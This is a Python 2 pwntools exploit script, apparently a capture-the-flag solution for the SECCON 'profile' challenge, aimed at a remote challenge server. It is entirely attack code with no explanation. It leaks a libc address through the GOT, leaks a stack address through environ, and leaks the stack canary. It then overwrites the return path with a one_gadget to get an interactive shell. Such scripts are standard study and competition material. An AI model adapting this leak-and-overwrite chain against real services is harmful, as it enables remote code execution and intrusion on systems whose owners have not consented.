#!/usr/bin/env python2
from pwn import *
#r = remote('localhost', 4000)
r = remote('profile.pwn.seccon.jp', 28553)
libc = ELF('./libc.so.6')

read_got = 0x602028

r.sendlineafter('>> ', 'A'*8)
r.sendlineafter('>> ', '88888888')
r.sendlineafter('>> ', 'CCCCCCCCCC')

r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', 'C'*16+p64(read_got))
r.sendlineafter('>> ', '2')
r.recvuntil('ame : ')

leak = u64(r.recvn(8))
libc.address = leak - libc.symbols['read']
one_gadget = libc.address + 0x45216


print hex(libc.address)

r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', 'C'*16+p64(libc.symbols['environ']))
r.sendlineafter('>> ', '2')
r.recvuntil('ame : ')
leak = u64(r.recvn(8))
rbp = leak - 0xf8
buf = leak - 0x128

print hex(rbp)


r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', 'C'*16+p64(rbp-0x18))
r.sendlineafter('>> ', '2')
r.recvuntil('ame : ')
canary = u64(r.recvn(8))
print hex(canary)

r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', 'C'*16+p64(buf)+p64(8)+'A'*24+p64(canary)+'A'*24+p64(one_gadget))

r.sendlineafter('>> ', '0')
r.interactive()
